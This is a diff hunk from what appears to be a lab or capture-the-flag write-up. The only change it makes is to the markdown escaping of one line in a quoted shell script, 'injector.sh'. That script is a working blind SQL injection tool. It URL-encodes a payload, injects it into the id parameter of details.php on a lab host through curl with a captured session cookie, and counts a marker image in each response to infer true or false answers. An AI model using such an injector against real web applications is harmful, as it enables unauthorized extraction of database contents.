@@ -106,7 +106,7 @@ kali@kali:~$ cat injector.sh
 >INJ=$1  
 >
 >#SANITIZE VARIABLE  
->_INJ_=$(echo $INJ | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/"/%22/g' )  
+>\_INJ\_=$(echo $INJ | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/"/%22/g' )  
 >
 >curl -s "http://192.168.1.76/jabcd0cs/details.php?id=1%20and%20$_INJ_&state=2" -H 'Host: 192.168.1.76' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.1.76/jabcd0cs/out.php?' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521654334977%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=tlepojod9vsfojcqj7eao6t9j4' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' | grep -c "images/file_unlocked.png"  
 
